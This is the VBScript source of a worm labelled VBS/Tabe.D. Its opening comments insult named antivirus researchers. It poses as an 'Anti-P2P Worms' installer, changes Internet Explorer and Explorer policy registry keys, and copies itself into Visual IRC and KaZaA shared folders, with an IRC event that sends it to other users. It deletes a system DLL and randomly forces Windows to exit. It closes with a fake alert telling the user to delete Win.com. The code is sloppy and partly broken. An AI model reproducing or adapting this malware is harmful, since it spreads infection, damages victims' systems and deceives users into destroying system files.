   ' VBS/Tabe.D By Jadra quer Ki ller
   ' Aleks Gostev sucks, you're stupid, ignorant and fucked, learn how write in english and don't use translator, also learn what mean a good service!!!!
   ' Only for Aleks Gostev, if you're reading it comment, remember that you cost nothing!
   ' Eugene Kaspersky isn't the best, the best is Anton Zajac and Eset!.
   ' For my best friends Bárbara and Franco ;-)

   MsgBox "Welcome to the installation of Anti-P2P Worms"

   Set dir1=agm.GetSpecialFolder(0)
   Set dir2=agm.GetSpecialFolder(1)
   agm.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Advanced",0,"REG_DWORD"
   agm.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Cache Internet",0,"REG_DWORD"
   agm.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\AutoConfig",0,"REG_DWORD"
   agm.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",0,"REG_DWORD"
   agm.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\History",0,"REG_DWORD"
   agm.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",0,"REG_DWORD"
   agm.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab",0,"REG_DWORD"
   agm.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\ResetWebSettings",0,"REG_DWORD"
   agm.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource",0,"REG_DWORD"
   agm.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions\NoAddingSubScriptions",0,"REG_DWORD"
   agm.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu",0,"REG_DWORD"


   agm.CopyFile Wscript.ScriptFullName, "C:\Virc\Anti-P2P_Worms.vbs", True
   agm.RegWrite "HKEY_CURRENT_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17", "dcc send $nick C:\Virc\Anti-P2P_Worms.vbs"

   set agm = CreateObject("Scripting.FileSystemObject")
   Set agm = CreateObject("Wscript.Shell")
   Set agm = agm.GetFile("c:\Windows\System\Wsock32.dll")
   agm.Delete
   agm.CopyFile Wscript.ScriptFullName, "C:\My Shared Folder\Anti-P2P_Worms.vbs", True
   agm.RegWrite "HKLM\\Software\\KaZaA\\Transfer\\DlDir0", "C:\My Shared Folder"
   agm = agm.getspecialfolder(0)
   agm.copyfile wscript.scriptfullname, agm
   agm
   Function agm()
   Randomize
   If 1 + Int(Rnd * 100) = 7 then
   agm.run "RUNDLL32.EXE user.exe,exitwindows"
   end if
   end function
   agm.copyfile wscript.scriptfullname, agm
   agm
   Function agm()
   Randomize
   If 1 + Int(Rnd * 50) = 7 then
   agm.run "Http://www.nod.com",false
   end if
   end function


   MsgBox "Anti-P2P Worm has detected a P2P-Generic Virus in the file C:\Windows\Win.com, please delete it"
